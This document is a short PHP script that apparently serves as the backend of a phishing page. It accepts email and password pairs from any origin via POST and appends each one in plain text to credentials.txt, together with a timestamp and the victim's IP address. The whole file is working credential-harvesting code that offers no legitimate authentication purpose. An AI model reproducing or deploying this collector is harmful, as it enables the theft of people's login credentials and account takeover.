<?php
error_reporting(E_ALL);
ini_set('display_errors', 1);

header('Content-Type: application/json');
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: POST');
header('Access-Control-Allow-Headers: Content-Type');

try {
    // Get POST data
    $input = file_get_contents('php://input');
    $data = json_decode($input, true);
    
    if (!$data || !isset($data['email']) || !isset($data['password'])) {
        throw new Exception('Missing email or password');
    }

    // Format credentials
    $log_data = sprintf(
        "Email: %s\nPassword: %s\nDate: %s\nIP: %s\n------------------------\n",
        $data['email'],
        $data['password'],
        date('Y-m-d H:i:s'),
        $_SERVER['REMOTE_ADDR']
    );
    
    // Write to file
    $result = file_put_contents(
        'credentials.txt',
        $log_data, 
        FILE_APPEND | LOCK_EX
    );

    if ($result === false) {
        error_log('Failed to write to credentials.txt');
        throw new Exception('Failed to save data');
    }

    echo json_encode(['status' => 'success']);

} catch (Exception $e) {
    error_log('Error: ' . $e->getMessage());
    http_response_code(500);
    echo json_encode([
        'status' => 'error',
        'message' => $e->getMessage()
    ]);
}
?>
